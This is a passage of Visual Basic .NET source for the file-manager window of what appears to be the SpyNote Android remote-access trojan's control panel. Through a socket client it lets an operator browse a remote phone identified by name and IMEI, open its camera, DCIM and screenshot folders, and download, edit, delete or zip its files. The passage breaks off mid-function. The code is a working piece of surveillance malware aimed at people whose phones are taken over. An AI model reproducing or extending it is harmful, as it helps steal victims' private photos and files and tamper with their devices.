Imports Microsoft.VisualBasic.CompilerServices
Imports System.ComponentModel
Imports System.Drawing.Drawing2D
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Text
Imports System.Text.RegularExpressions
Imports System.Threading
Imports SpyNote_V6._4.SN.SpyNote.Stores
Imports SpyNote_V6._4.SN
Imports SpyNote_V6._4.SN.Sockets.SpyNote.Client

Public Class File_Manager
    Public TClient As SocketClient

    Private indxOld As Integer

    Private imageList_0 As ImageList

    Private ToolTip_0 As SN.ToolTip_0

    Private x As Integer

    Private y As Integer

    Private testName As String

    Private aLISTObject As List(Of Object)

    Private aLIST As List(Of String)

    Private aBoolBack As Boolean

    Private aBoolNext As Boolean

    Private idfile As Integer

    Private strNameFile As String

    Private Clipboard_Cut As String

    Private Path_Cut As String

    Private Clipboard_Copy As String

    Private Path_Copy As String

    Private x1 As Integer

    Private y1 As Integer

    Private oldX As Integer

    Private oldY As Integer

    Private newpoint As Point

    Private aq1 As Integer

    Public Sub New()
        Me.indxOld = -1
        Me.imageList_0 = New ImageList()
        Me.ToolTip_0 = New ToolTip_0()
        Me.aLISTObject = New List(Of Object)()
        Me.idfile = -1
        Me.strNameFile = Nothing
        Me.newpoint = Nothing
        Me.InitializeComponent()
    End Sub

    Private Sub AddFilesToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles AddFilesToolStripMenuItem.Click
        Dim addFile As AddFiles = New AddFiles() With
        {
            .imageList_0 = Me.imageList_0
        }
        If (addFile.ShowDialog(Me) = System.Windows.Forms.DialogResult.OK) Then
            Try
                Dim str As String = addFile.aFileName.Text.Trim()
                If (Operators.CompareString(str, "", False) <> 0) Then
                    If (Not Operators.ConditionalCompareObjectEqual(addFile.FolderORfile.Tag, "0", False)) Then
                        Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(38)), Data.SplitData, Me.TEXTPATH.Text, "/", str, Data.SplitData, "True"}))
                    Else
                        Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(38)), Data.SplitData, Me.TEXTPATH.Text, "/", str, Data.SplitData, "false"}))
                    End If
                End If
                addFile.Close()
            Catch exception As System.Exception
                addFile.Close()
            End Try
        Else
            addFile.Close()
        End If
    End Sub

    Private Sub ALOLO_Resize(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Resize
        Me.BOXDOWN.Invalidate()
    End Sub

    Private Sub BOXDOWN_Paint(ByVal sender As Object, ByVal e As PaintEventArgs) Handles BOXDOWN.Paint
        Dim color As System.Drawing.Color = System.Drawing.Color.FromArgb(30, 30, 30)
        Dim rectangle As System.Drawing.Rectangle = New System.Drawing.Rectangle(0, 0, Me.BOXDOWN.Width, Me.BOXDOWN.Height)
        ControlPaint.DrawBorder(e.Graphics, rectangle, color, 1, ButtonBorderStyle.None, color, 1, ButtonBorderStyle.Solid, color, 1, ButtonBorderStyle.None, color, 1, ButtonBorderStyle.None)
        Dim font As System.Drawing.Font = New System.Drawing.Font("Segoe UI Semibold", 8.25!, FontStyle.Regular)
        Dim solidBrush As System.Drawing.Brush = New System.Drawing.SolidBrush(System.Drawing.Color.FromArgb(255, 241, 241, 241))
        Dim rowCount As Integer = Me.ViewManager.Rows.GetRowCount(DataGridViewElementStates.Selected)
        Dim str As String = String.Concat("Selected ", rowCount.ToString())
        Dim backColor As System.Drawing.Color = Me.BOXDOWN.BackColor
        Dim r As Byte = backColor.R
        backColor = Me.BOXDOWN.BackColor
        Dim g As Byte = backColor.G
        backColor = Me.BOXDOWN.BackColor
        Dim brush As System.Drawing.Brush = New System.Drawing.SolidBrush(System.Drawing.Color.FromArgb(220, CInt(r), CInt(g), CInt(backColor.B)))
        Dim size As System.Drawing.Size = TextRenderer.MeasureText(String.Concat("Ln ", Me.aq1.ToString()), font)
        Dim size1 As System.Drawing.Size = TextRenderer.MeasureText(str, font)
        Dim rectangle1 As System.Drawing.Rectangle = New System.Drawing.Rectangle(0, 2, Me.BOXDOWN.Width, size1.Height)
        e.Graphics.FillRectangle((New Pen(brush)).Brush, rectangle1)
        e.Graphics.DrawString(str, font, solidBrush, 0!, 2.0!)
        Dim num As Integer = CInt(Math.Round(CDbl(Me.BOXDOWN.Width) / 2))
        Dim width As Integer = Me.BOXDOWN.Width - size.Width
        rowCount = Me.ViewManager.Rows.Count
        Dim size2 As System.Drawing.Size = TextRenderer.MeasureText(String.Concat("Count ", rowCount.ToString()), font)
        Dim rectangle2 As System.Drawing.Rectangle = New System.Drawing.Rectangle(num, 2, Me.BOXDOWN.Width, size2.Height)
        e.Graphics.FillRectangle((New Pen(brush)).Brush, rectangle2)
        Dim graphics As System.Drawing.Graphics = e.Graphics
        rowCount = Me.ViewManager.Rows.Count
        graphics.DrawString(String.Concat("Count ", rowCount.ToString()), font, solidBrush, CSng(num), 2.0!)
        Dim rectangle3 As System.Drawing.Rectangle = New System.Drawing.Rectangle(width, 2, Me.BOXDOWN.Width, size.Height)
        e.Graphics.FillRectangle((New Pen(brush)).Brush, rectangle3)
        e.Graphics.DrawString(String.Concat("Ln ", Me.aq1.ToString()), font, solidBrush, CSng(width), 2.0!)
    End Sub

    Private Sub BTNBACK0_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BTNBACK0.Click
        Try
            If (Me.TEXTPATH.Enabled) Then
                Me.aBoolBack = True
                Me.TEXTPATH.Text = Me.TEXTPATH.Text.Replace("\", "/")
                Me.TEXTPATH.Refresh()
                Dim str As String = "/"
                Dim text As String = Me.TEXTPATH.Text
                Dim str1 As String = str
                If (Operators.CompareString(text, Nothing, False) = 0) Then
                    Return
                ElseIf (Operators.CompareString(text, str, False) <> 0) Then
                    Dim matchCollections As MatchCollection = (New Regex(str1)).Matches(text)
                    Dim strArrays As String() = text.Split(New Char() {Conversions.ToChar(str)})
                    Dim count As Integer = matchCollections.Count
                    Dim str2 As String = strArrays(Conversions.ToInteger(count.ToString()))
                    Dim bTNNEXT0 As SN.ThemeButtonImge = Me.BTNNEXT0
                    Dim themeButtonImge As SN.ThemeButtonImge = bTNNEXT0
                    bTNNEXT0.Tag = Operators.AddObject(themeButtonImge.Tag, String.Concat(str, str2))
                    Try
                        Dim strArrays1() As String = {str}
                        Dim str3 As String = Nothing
                        Dim strArrays2 As String() = Me.TEXTPATH.Text.Split(strArrays1, StringSplitOptions.None)
                        Dim length As Integer = CInt(strArrays2.Length) - 2
                        Dim num As Integer = 0
                        Do
                            str3 = If(num = CInt(strArrays2.Length) - 2, String.Concat(str3, strArrays2(num)), String.Concat(str3, strArrays2(num), str))
                            num = num + 1
                        Loop While num <= length
                        Me.TEXTPATH.Text = str3
                    Catch exception As System.Exception
                        Me.TEXTPATH.Text = Me.TEXTPATH.Text.Replace(String.Concat("/", str2), Nothing)
                    End Try
                    If (Operators.CompareString(Me.TEXTPATH.Text, Nothing, False) = 0) Then
                        Me.TEXTPATH.Text = "/"
                    End If
                    Me.BTNNEXT0.Enabled = True
                    Me.TEXTPATH.Enabled = False
                    Me.GetPath(Me.TEXTPATH.Text)
                Else
                    Return
                End If
            End If
        Catch exception1 As System.Exception
        End Try
    End Sub

    Private Sub BTNNEXT0_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BTNNEXT0.Click
        Try
            If (Me.TEXTPATH.Enabled) Then
                Me.aBoolNext = True
                Me.TEXTPATH.Text = Me.TEXTPATH.Text.Replace("\", "/")
                Me.TEXTPATH.Refresh()
                Dim str As String = "/"
                Dim str1 As String = str
                Dim str2 As String = Me.BTNNEXT0.Tag.ToString()
                If (Operators.CompareString(str2, Nothing, False) <> 0) Then
                    Dim matchCollections As MatchCollection = (New Regex(str1)).Matches(str2)
                    Dim strArrays As String() = str2.Split(New Char() {Conversions.ToChar(str)})
                    Dim count As Integer = matchCollections.Count
                    Dim str3 As String = strArrays(Conversions.ToInteger(count.ToString()))
                    If (Operators.CompareString(Me.TEXTPATH.Text, str, False) <> 0) Then
                        Me.TEXTPATH.Text = String.Concat(Me.TEXTPATH.Text, str, str3)
                    Else
                        Me.TEXTPATH.Text = String.Concat(Me.TEXTPATH.Text, str3)
                    End If
                    Try
                        Dim strArrays1() As String = {str}
                        Dim str4 As String = Nothing
                        Dim strArrays2 As String() = str2.Split(strArrays1, StringSplitOptions.None)
                        Dim length As Integer = CInt(strArrays2.Length) - 2
                        Dim num As Integer = 0
                        Do
                            str4 = If(num = CInt(strArrays2.Length) - 2, String.Concat(str4, strArrays2(num)), String.Concat(str4, strArrays2(num), str))
                            num = num + 1
                        Loop While num <= length
                        Me.BTNNEXT0.Tag = str4
                        If (Operators.CompareString(Me.BTNNEXT0.Tag.ToString(), Nothing, False) = 0) Then
                            Me.BTNNEXT0.Enabled = False
                            Me.BTNBACK0.Focus()
                        End If
                    Catch exception As System.Exception
                        Me.BTNNEXT0.Tag = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Me.BTNNEXT0.Tag, Nothing, "Replace", New Object() {String.Concat(str, str3), Nothing}, Nothing, Nothing, Nothing))
                    End Try
                    Me.TEXTPATH.Enabled = False
                    Me.GetPath(Me.TEXTPATH.Text)
                Else
                    Me.BTNNEXT0.Enabled = False
                    Me.BTNBACK0.Focus()
                    Return
                End If
            End If
        Catch exception1 As System.Exception
        End Try
    End Sub

    Private Sub Camera_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Camera.Click
        If (Me.TEXTPATH.Enabled) Then
            Me.BTNNEXT0.Tag = Nothing
            Me.BTNNEXT0.Enabled = False
            Me.BTNBACK0.Focus()
            Me.GetPath(CStr(Me.Camera.Tag))
        End If
    End Sub

    Private Sub cntxDowManager_Opening(ByVal sender As Object, ByVal e As CancelEventArgs) Handles cntxDowManager.Opening
        Dim rowCount As Integer = Me.ViewManager.Rows.GetRowCount(DataGridViewElementStates.Selected)
        If (Not (Operators.CompareString(Me.Clipboard_Cut, Nothing, False) = 0 And Operators.CompareString(Me.Clipboard_Copy, Nothing, False) = 0 And Operators.CompareString(Me.Path_Copy, Nothing, False) = 0)) Then
            Me.PasteToolStripMenuItem.Enabled = True
        Else
            Me.PasteToolStripMenuItem.Enabled = False
        End If
        If (Me.ViewManager.SelectedRows.Count = 0) Then
            Me.OpenTheFileUsingToolStripMenuItem.Enabled = False
            Me.DownloadToolStripMenuItem.Enabled = False
            Me.CutToolStripMenuItem.Enabled = False
            Me.CopyToolStripMenuItem.Enabled = False
            Me.EditfileToolStripMenuItem.Enabled = False
            Me.DeleteToolStripMenuItem.Enabled = False
            Me.RenameToolStripMenuItem.Enabled = False
            Me.SetWallpaperToolStripMenuItem.Enabled = False
            Me.MediaPlayerToolStripMenuItem.Enabled = False
            Me.ZipToolStripMenuItem.Enabled = False
        End If
        If (rowCount > 1) Then
            Me.RenameToolStripMenuItem.Enabled = False
            Me.SetWallpaperToolStripMenuItem.Enabled = False
            Me.MediaPlayerToolStripMenuItem.Enabled = False
            Dim count As Integer = Me.ViewManager.SelectedRows.Count - 1
            While count >= 0
                Dim str As String = Conversions.ToString(Me.ViewManager.Rows(Me.ViewManager.SelectedRows(count).Index).Cells(3).Value)
                If (Not str.StartsWith("Folder Files")) Then
                    Me.DownloadToolStripMenuItem.Enabled = True
                    Me.EditfileToolStripMenuItem.Enabled = True
                    Me.DeleteToolStripMenuItem.Enabled = True
                    Me.CopyToolStripMenuItem.Enabled = True
                    Me.CutToolStripMenuItem.Enabled = True
                    If (Operators.CompareString(str.ToUpper(), ".ZIP", False) = 0) Then
                        Me.UnZipToolStripMenuItem.Enabled = True
                    Else
                        Me.UnZipToolStripMenuItem.Enabled = False
                    End If
                    Me.ZipToolStripMenuItem.Enabled = True
                    Me.DeleteToolStripMenuItem.Enabled = True
                    Me.OpenTheFileUsingToolStripMenuItem.Enabled = True
                    count = count + -1
                Else
                    Me.DownloadToolStripMenuItem.Enabled = False
                    Me.EditfileToolStripMenuItem.Enabled = False
                    Me.CopyToolStripMenuItem.Enabled = False
                    Me.CutToolStripMenuItem.Enabled = False
                    Me.ZipToolStripMenuItem.Enabled = False
                    Me.OpenTheFileUsingToolStripMenuItem.Enabled = False
                    If (Not str.EndsWith("(0)")) Then
                        Me.DeleteToolStripMenuItem.Enabled = False
                    End If
                    Return
                End If
            End While
        ElseIf (rowCount = 1) Then
            Me.RenameToolStripMenuItem.Enabled = True
            For i As Integer = Me.ViewManager.SelectedRows.Count - 1 To 0 Step -1
                Dim str1 As String = Conversions.ToString(Me.ViewManager.Rows(Me.ViewManager.SelectedRows(i).Index).Cells(3).Value)
                If (Not str1.StartsWith("Folder Files")) Then
                    Me.DownloadToolStripMenuItem.Enabled = True
                    Me.EditfileToolStripMenuItem.Enabled = True
                    Me.DeleteToolStripMenuItem.Enabled = True
                    Me.CopyToolStripMenuItem.Enabled = True
                    Me.CutToolStripMenuItem.Enabled = True
                    If (Operators.CompareString(str1.ToUpper(), ".ZIP", False) = 0) Then
                        Me.UnZipToolStripMenuItem.Enabled = True
                    Else
                        Me.UnZipToolStripMenuItem.Enabled = False
                    End If
                    Me.ZipToolStripMenuItem.Enabled = True
                    Me.OpenTheFileUsingToolStripMenuItem.Enabled = True
                Else
                    Me.DownloadToolStripMenuItem.Enabled = False
                    Me.EditfileToolStripMenuItem.Enabled = False
                    Me.CopyToolStripMenuItem.Enabled = False
                    Me.CutToolStripMenuItem.Enabled = False
                    Me.ZipToolStripMenuItem.Enabled = False
                    Me.OpenTheFileUsingToolStripMenuItem.Enabled = False
                    If (Not str1.EndsWith("(0)")) Then
                        Me.DeleteToolStripMenuItem.Enabled = False
                    End If
                End If
                If (Not (Operators.CompareString(str1.ToUpper(), ".3GP", False) = 0 Or Operators.CompareString(str1.ToUpper(), ".MP4", False) = 0 Or Operators.CompareString(str1.ToUpper(), ".MP3", False) = 0 Or Operators.CompareString(str1.ToUpper(), ".M4A", False) = 0 Or Operators.CompareString(str1.ToUpper(), ".WAV", False) = 0 Or Operators.CompareString(str1.ToUpper(), ".AAC", False) = 0 Or Operators.CompareString(str1.ToUpper(), ".MXMF", False) = 0 Or Operators.CompareString(str1.ToUpper(), ".OGG", False) = 0 Or Operators.CompareString(str1.ToUpper(), ".OTA", False) = 0 Or Operators.CompareString(str1.ToUpper(), ".RTTL", False) = 0 Or Operators.CompareString(str1.ToUpper(), ".RTX", False) = 0 Or Operators.CompareString(str1.ToUpper(), ".TS", False) = 0)) Then
                    Me.MediaPlayerToolStripMenuItem.Enabled = False
                Else
                    Me.MediaPlayerToolStripMenuItem.Enabled = True
                End If
                If (Not (Operators.CompareString(str1.ToUpper(), ".PNG", False) = 0 Or Operators.CompareString(str1.ToUpper(), ".BMP", False) = 0 Or Operators.CompareString(str1.ToUpper(), ".JPG", False) = 0 Or Operators.CompareString(str1.ToUpper(), ".JPEG", False) = 0)) Then
                    Me.SetWallpaperToolStripMenuItem.Enabled = False
                Else
                    Me.SetWallpaperToolStripMenuItem.Enabled = True
                End If
            Next

        End If
    End Sub

    Private Sub CopyToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles CopyToolStripMenuItem.Click
        Me.Path_Cut = Nothing
        Me.Path_Copy = Nothing
        Me.Clipboard_Cut = Nothing
        Me.Clipboard_Copy = Nothing
        If (Me.ViewManager.SelectedRows.Count > 0) Then
            For i As Integer = Me.ViewManager.SelectedRows.Count - 1 To 0 Step -1
                Dim str As String = Conversions.ToString(Me.ViewManager.Rows(Me.ViewManager.SelectedRows(i).Index).Cells(1).Value)
                Me.Clipboard_Copy = String.Concat(Me.Clipboard_Copy, str, "[*N\O*]")
                Me.Path_Copy = String.Concat(Me.Path_Copy, Me.TEXTPATH.Text, "/[*P\T*]")
            Next

        End If
    End Sub

    Private Sub CutToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles CutToolStripMenuItem.Click
        Me.Path_Cut = Nothing
        Me.Path_Copy = Nothing
        Me.Clipboard_Cut = Nothing
        Me.Clipboard_Copy = Nothing
        If (Me.ViewManager.SelectedRows.Count > 0) Then
            For i As Integer = Me.ViewManager.SelectedRows.Count - 1 To 0 Step -1
                Dim str As String = Conversions.ToString(Me.ViewManager.Rows(Me.ViewManager.SelectedRows(i).Index).Cells(1).Value)
                Me.Clipboard_Cut = String.Concat(Me.Clipboard_Cut, str, "[*N\O*]")
                Me.Path_Cut = String.Concat(Me.Path_Cut, Me.TEXTPATH.Text, "/[*P\T*]")
            Next

        End If
    End Sub

    Private Sub DeleteToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles DeleteToolStripMenuItem.Click
        If (Me.ViewManager.SelectedRows.Count > 0) Then
            For i As Integer = Me.ViewManager.SelectedRows.Count - 1 To 0 Step -1
                If (Not Conversions.ToString(Me.ViewManager.Rows(Me.ViewManager.SelectedRows(i).Index).Cells(3).Value).StartsWith("Folder Files")) Then
                    If (Me.TClient IsNot Nothing) Then
                        If (Not Me.TClient.IsClose) Then
                            Dim str As String = Conversions.ToString(Me.ViewManager.Rows(Me.ViewManager.SelectedRows(i).Index).Cells(1).Value)
                            Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(40)), Data.SplitData, Me.TEXTPATH.Text, "/", str}))
                            Me.ViewManager.Rows.RemoveAt(Me.ViewManager.SelectedRows(i).Index)
                            Try
                                Me.NF()
                            Catch exception As System.Exception
                            End Try
                        End If
                    End If
                ElseIf (Me.TClient IsNot Nothing) Then
                    If (Not Me.TClient.IsClose) Then
                        Dim str1 As String = Conversions.ToString(Me.ViewManager.Rows(Me.ViewManager.SelectedRows(i).Index).Cells(1).Value)
                        Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(41)), Data.SplitData, Me.TEXTPATH.Text, "/", str1}))
                        Me.ViewManager.Rows.RemoveAt(Me.ViewManager.SelectedRows(i).Index)
                        Try
                            Me.NF()
                        Catch exception1 As System.Exception
                        End Try
                    End If
                End If
            Next

        End If
    End Sub

    Private Sub DIRECTORY_DCIM_Click(ByVal sender As Object, ByVal e As EventArgs) Handles DIRECTORY_DCIM.Click
        If (Me.TEXTPATH.Enabled) Then
            Me.BTNNEXT0.Tag = Nothing
            Me.BTNNEXT0.Enabled = False
            Me.BTNBACK0.Focus()
            Me.GetPath(CStr(Me.DIRECTORY_DCIM.Tag))
        End If
    End Sub

    Private Sub DIRECTORY_DOWNLOADS_Click(ByVal sender As Object, ByVal e As EventArgs) Handles DIRECTORY_DOWNLOADS.Click
        If (Me.TEXTPATH.Enabled) Then
            Me.BTNNEXT0.Tag = Nothing
            Me.BTNNEXT0.Enabled = False
            Me.BTNBACK0.Focus()
            Me.GetPath(CStr(Me.DIRECTORY_DOWNLOADS.Tag))
        End If
    End Sub

    Private Sub DIRECTORY_PICTURES_Click(ByVal sender As Object, ByVal e As EventArgs) Handles DIRECTORY_PICTURES.Click
        If (Me.TEXTPATH.Enabled) Then
            Me.BTNNEXT0.Tag = Nothing
            Me.BTNNEXT0.Enabled = False
            Me.BTNBACK0.Focus()
            Me.GetPath(CStr(Me.DIRECTORY_PICTURES.Tag))
        End If
    End Sub
    Private Sub Download02ToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Download02ToolStripMenuItem.Click
        Try
            Dim str As String = String.Concat(New String() {Store.Resources(1), "\Clients\", Me.TClient.ClientName, "_", Me.TClient.ClientImei, "\Downloads"})
            If (Not File.Exists(str)) Then
                If (Not My.Computer.FileSystem.DirectoryExists(str)) Then
                    My.Computer.FileSystem.CreateDirectory(str)
                End If
                Process.Start(str)
            Else
                Process.Start(str)
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub DownloadToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles DownloadToolStripMenuItem.Click
        If (Me.ViewManager.SelectedRows.Count > 0) Then
            For i As Integer = Me.ViewManager.SelectedRows.Count - 1 To 0 Step -1
                If (Not Conversions.ToString(Me.ViewManager.Rows(Me.ViewManager.SelectedRows(i).Index).Cells(3).Value).StartsWith("Folder Files")) Then
                    Dim str As String = Conversions.ToString(Me.ViewManager.Rows(Me.ViewManager.SelectedRows(i).Index).Cells(1).Value)
                    Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(18)), Data.SplitData, Me.TEXTPATH.Text, Data.SplitData, str}))
                End If
            Next

            Me.TClient.Send(String.Concat(Store.BFF(Store.buff, CLng(34)), Data.SplitData))
        End If
    End Sub

    Private Sub EditfileToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles EditfileToolStripMenuItem.Click
        If (Me.ViewManager.SelectedRows.Count > 0) Then
            For i As Integer = Me.ViewManager.SelectedRows.Count - 1 To 0 Step -1
                If (Not Conversions.ToString(Me.ViewManager.Rows(Me.ViewManager.SelectedRows(i).Index).Cells(3).Value).StartsWith("Folder Files")) Then
                    Dim str As String = Conversions.ToString(Me.ViewManager.Rows(Me.ViewManager.SelectedRows(i).Index).Cells(1).Value)
                    Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(20)), Data.SplitData, Me.TEXTPATH.Text, Data.SplitData, str}))
                End If
            Next

        End If
    End Sub

    Private Sub File_Manager_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        Dim str As String
        MyBase.Icon = New System.Drawing.Icon(String.Concat(Store.Resources(1), "\Icons\window\win\1.ico"))
        Me.TEXTPATH.HTBTB.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.PCNOTF.Image = Store.Bitmap_0("NFD\nf")
        Me.SELCT_PK.Renderer = New ThemeToolStrip()
        Me.cntxDowManager.Renderer = New ThemeToolStrip()
        DirectCast(Me.ZipToolStripMenuItem.DropDown, ToolStripDropDownMenu).ShowImageMargin = False
        DirectCast(Me.ZipToolStripMenuItem.DropDown, ToolStripDropDownMenu).BackColor = Me.cntxDowManager.BackColor
        Me.ToolTip_0._ToolTip.SetToolTip(Me.BTNBACK0, "Go Back")
        Me.ToolTip_0._ToolTip.SetToolTip(Me.BTNNEXT0, "Go Forward")
        Me.ToolTip_0._ToolTip.SetToolTip(Me.StorageDirectory, "Storage Directory")
        Me.ToolTip_0._ToolTip.SetToolTip(Me.DIRECTORY_DOWNLOADS, "Downloads Directory")
        Me.ToolTip_0._ToolTip.SetToolTip(Me.DIRECTORY_DCIM, "DCIM Directory")
        Me.ToolTip_0._ToolTip.SetToolTip(Me.DIRECTORY_PICTURES, "Pictures Directory")
        Me.ToolTip_0._ToolTip.SetToolTip(Me.Screenshots, "Screenshots Directory")
        Me.ToolTip_0._ToolTip.SetToolTip(Me.Camera, "Camera Directory")
        Dim flag As Boolean = False
        Dim files As String() = Directory.GetFiles(String.Concat(Store.Resources(1), "\Icons\FileManager\"))
        Dim strArrays As String() = files
        Dim num As Integer = 0
        While num < CInt(strArrays.Length)
            str = strArrays(num)
            If (Not flag) Then
                Me.Column1.Width = 40
                Dim imageList0 As ImageList = Me.imageList_0
                Dim size As System.Drawing.Size = Image.FromFile(str).Size
                Dim width As Integer = size.Width
                size = Image.FromFile(str).Size
                imageList0.ImageSize = New System.Drawing.Size(width, size.Height)
                Me.imageList_0.ColorDepth = ColorDepth.Depth32Bit
                flag = True
            End If
            Dim fileNameWithoutExtension As String = Path.GetFileNameWithoutExtension(str)
            Me.imageList_0.Images.Add(fileNameWithoutExtension.ToUpper(), Image.FromFile(str))
            num = num + 1
        End While
        Me.BTNBACK0.ImageChoice = Store.Bitmap_0("FileBox\Left")
        Me.BTNBACK0.ShowImage = True
        Me.BTNNEXT0.ImageChoice = Store.Bitmap_0("FileBox\Right")
        Me.BTNNEXT0.ShowImage = True
        Me.StorageDirectory.ImageChoice = Store.Bitmap_0("FileBox\Storage")
        Me.StorageDirectory.ShowImage = True
        Me.DIRECTORY_DOWNLOADS.ImageChoice = Store.Bitmap_0("FileBox\Download")
        Me.DIRECTORY_DOWNLOADS.ShowImage = True
        Me.DIRECTORY_DCIM.ImageChoice = Store.Bitmap_0("FileBox\DCIM")
        Me.DIRECTORY_DCIM.ShowImage = True
        Me.DIRECTORY_PICTURES.ImageChoice = Store.Bitmap_0("FileBox\Pictures")
        Me.DIRECTORY_PICTURES.ShowImage = True
        Me.Screenshots.ImageChoice = Store.Bitmap_0("FileBox\Screenshot")
        Me.Screenshots.ShowImage = True
        Me.Camera.ImageChoice = Store.Bitmap_0("FileBox\Camera")
        Me.Camera.ShowImage = True
        Me.OpenTheFileUsingToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        Me.OpenTheFileUsingToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\op_app")
        Me.MediaPlayerToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        Me.MediaPlayerToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\play")
        Me.RefreshToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        Me.RefreshToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\re")
        Me.Download02ToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        Me.Download02ToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\fd")
        Me.UploadFileToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        Me.UploadFileToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\u")
        Me.DownloadToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        Me.DownloadToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\d")
        Me.CutToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        Me.CutToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\cat")
        Me.CopyToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        Me.CopyToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\cp")
        Me.ZipToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        Me.ZipToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\zipF")
        Me.PasteToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        Me.PasteToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\pas")
        Me.EditfileToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        Me.EditfileToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\ed")
        Me.DeleteToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        Me.DeleteToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\del")
        Me.RenameToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        Me.RenameToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\ren")
        Me.AddFilesToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        Me.AddFilesToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\ad")
        Me.SetWallpaperToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        Me.SetWallpaperToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\setw")
        Me.StartToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        Me.StartToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\play_s")
        Me.StopToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        Me.StopToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\stop_s")
        Try
            Dim str1 As String = String.Concat(Store.Resources(1), "\Imports\OBU.inf")
            If (File.Exists(str1)) Then
                Dim strArrays1 As String() = File.ReadAllLines(str1)
                Dim num1 As Integer = 0
                While num1 < CInt(strArrays1.Length)
                    str = strArrays1(num1)
                    Dim strArrays2 As String() = str.Split(New String() {"{Package}"}, StringSplitOptions.RemoveEmptyEntries)
                    Dim toolStripMenuItem As System.Windows.Forms.ToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem() With
                    {
                        .Text = strArrays2(0),
                        .Name = String.Concat("m_item", Conversions.ToString(Me.SELCT_PK.Items.Count)),
                        .Tag = strArrays2(1),
                        .ImageScaling = ToolStripItemImageScaling.None
                    }
                    Dim toolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem = toolStripMenuItem
                    AddHandler toolStripMenuItem1.Click, New EventHandler(AddressOf Me.SPK)
                    Me.SELCT_PK.Items.Add(toolStripMenuItem1)
                    num1 = num1 + 1
                End While
            End If
            If (Me.SELCT_PK.Items.Count > 0) Then
                Me.OpenTheFileUsingToolStripMenuItem.DropDown = Me.SELCT_PK
            End If
        Catch exception As System.Exception
        End Try
        Me.Trans.Interval = Store.transparency
        Me.Trans.Enabled = True
        Me.TScrolls.Interval = Store.TScrollsInterval
        Me.TProgressBar.Interval = Store.TProgressBarInterval
        Me.TProgressBar.Enabled = True
        Me.TScrolls.Enabled = True
    End Sub

    Private Sub GetPath(ByVal path As String)
        If (Not Me.aBoolNext) Then
            Me.SetObj(Me.TEXTPATH.Text, Me.testName)
        End If
        Me.TEXTPATH.Text = Me.TEXTPATH.Text.Replace("/", "\")
        Me.TEXTPATH.Refresh()
        If (Me.TClient IsNot Nothing) Then
            Me.TClient.Send(String.Concat(Store.BFF(Store.buff, CLng(14)), Data.SplitData, path))
        End If
    End Sub

    Private Sub GridViewoVerticalScrollBar0()
        Dim flag As Boolean = Me.PCNOTF.Visible > False
        If flag Then
            Dim flag2 As Boolean = Me.VisualStudioHorizontalScrollBar1.Visible > False
            If flag2 Then
                Me.VisualStudioHorizontalScrollBar1.Visible = False
            End If
            Dim flag3 As Boolean = Me.VisualStudioVerticalScrollBar1.Visible > False
            If flag3 Then
                Me.VisualStudioVerticalScrollBar1.Visible = False
            End If
        Else
            Dim columnsWidth As Integer = Me.ViewManager.Columns.GetColumnsWidth(DataGridViewElementStates.Visible)
            Dim flag4 As Boolean = columnsWidth >= Me.ViewManager.Width
            If flag4 Then
                Me.VisualStudioHorizontalScrollBar1.Maximum = columnsWidth - Me.ViewManager.Width
            Else
